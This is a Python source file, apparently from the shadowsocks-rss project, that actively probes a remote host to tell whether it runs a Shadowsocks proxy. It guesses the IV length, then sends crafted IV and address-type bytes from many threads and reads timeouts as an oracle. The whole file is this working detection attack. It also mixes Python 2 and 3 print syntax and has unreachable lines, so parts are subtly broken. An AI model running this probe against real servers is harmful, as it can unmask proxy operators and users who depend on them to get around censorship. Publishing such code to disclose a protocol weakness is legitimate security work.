#!/usr/bin/env python
#-*- coding: utf-8 -*-

'''
Copyleft (c) 2015 breakwa11
https://github.com/breakwa11/shadowsocks-rss
'''

import logging
import socket
import time
import traceback
import os
import struct
import threading

iv_buffer_max_size = 256 # from ss-libev setting
scan_max_try = 256 * 7
max_thread_num = 32

def compat_ord(s):
    if type(s) == int:
        return s
    return _ord(s)

def compat_chr(d):
    if bytes == str:
        return _chr(d)
    return bytes([d])

_ord = ord
_chr = chr
ord = compat_ord
chr = compat_chr

def to_bytes(s):
    if bytes != str:
        if type(s) == str:
            return s.encode('utf-8')
    return s

def to_str(s):
    if bytes != str:
        if type(s) == bytes:
            return s.decode('utf-8')
    return s

def random_string(length):
    return os.urandom(length)

def test_single(iv, ip, port, addrtype, attack_data, timeout = 10):
    try:
        addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)
        af, socktype, proto, canonname, sa = addrs[0]
        s = socket.socket(af, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(sa)
        s.send(iv + to_bytes(chr(addrtype)) + attack_data)
        ok = False
        try:
            ret = s.recv(1024)
        except socket.timeout:
            ok = True
        except:
            pass
        return ok
    except:
        pass

class TestThread(threading.Thread):
    def __init__(self, lock, semaphore, index, attack_ok_list, params):
        threading.Thread.__init__(self)
        self.lock = lock
        self.semaphore = semaphore
        self.index = index
        self.params = params
        self.attack_ok_list = attack_ok_list
        semaphore.acquire()

    def run(self):
        for retry in range(3):
            ok = test_single(*self.params)
            if ok is None:
                continue
            if ok:
                self.lock.acquire()
                self.attack_ok_list.append([self.params[0], self.params[3], self.index])
                self.lock.release()
            break
        self.semaphore.release()

def scan(iv_len, addr, port):
    print("scan %s:%d" % (addr, port))
    iv_data = random_string(iv_len - 2)
    attack_ok_list = []
    addrtype = 0
    att_data_len = 6
    attack_data = random_string(att_data_len)
    attack_fail = False
    lock = threading.Lock()
    semaphore = threading.Semaphore(max_thread_num)
    for index in range(scan_max_try + iv_buffer_max_size):
        if index % 100 == 20:
            print("%d%%" % (index * 100 / (scan_max_try + iv_buffer_max_size)))
        iv = iv_data + struct.pack('>H', index)
        if index >= 8 + max_thread_num and len(attack_ok_list) > index - max_thread_num:
            attack_fail = True
            break
        elif index > 128 and len(attack_ok_list) > scan_max_try * 8 / 256:
            attack_fail = True
            break
        testThread = TestThread(lock, semaphore, index, attack_ok_list, (iv, addr, port, addrtype, attack_data))
        testThread.start()

    print("Waiting response")
    for thread_num in range(max_thread_num):
        semaphore.acquire()

    if len(attack_ok_list) == 0 or attack_fail:
        print("%s:%d is an unknown server" % (addr, port))
        return False

    print("Double check")
    attack_data2 = random_string(att_data_len)
    while attack_data2 == attack_data:
        attack_data2 = random_string(att_data_len)
    for attack_item in attack_ok_list:
        if attack_item[2] >= scan_max_try:
            break
        for retry in range(3):
            ok = test_single(attack_item[0], addr, port, attack_item[1], attack_data2)
            if ok is not None:
                break
        if ok:
            print("%s:%d is a Shadowsocks server" % (addr, port))
            return True
    print("%s:%d is an unknown server" % (addr, port))
    return False

def test_single_size(ip, port, iv_size, timeout = 1):
    try:
        addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)
        af, socktype, proto, canonname, sa = addrs[0]
        s = socket.socket(af, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(sa)
        if iv_size:
            s.send(random_string(iv_size))
        for i in range(100):
            iv_size += 1
            print("test iv size %d" % (iv_size,))
            s.send(random_string(4))
            try:
                ret = s.recv(1024)
                return iv_size - 1
                print "receive data ok"
            except socket.timeout:
                print "timeout"
                continue
            except:
                print "error"
                break
        return iv_size
    except:
        pass

def test(addr, port):
    iv_len = test_single_size(addr, port, 10)
    if iv_len is None:
        print("can not connect to %s:%d" % (addr, port))
        return

    if not iv_len or iv_len > 16:
        print("%s:%d is an unknown server" % (addr, port))
        return

    iv_len2 = test_single_size(addr, port,10)
    if iv_len2 is None:
        print("can not connect to %s:%d" % (addr, port))
        return

    if iv_len != iv_len2:
        print("%s:%d is an unknown server" % (addr, port))
        return
    print("iv size of %s:%d is %d" % (addr, port, iv_len))
    scan(iv_len, addr, port)

if __name__ == '__main__':
    '''
    99.91% success in theroy
    '''
    #test("123.125.114.144", 80) # test baidu
    #test("123.125.114.144", 443) # test baidu
    test("x.x.x.x.com", 20720)

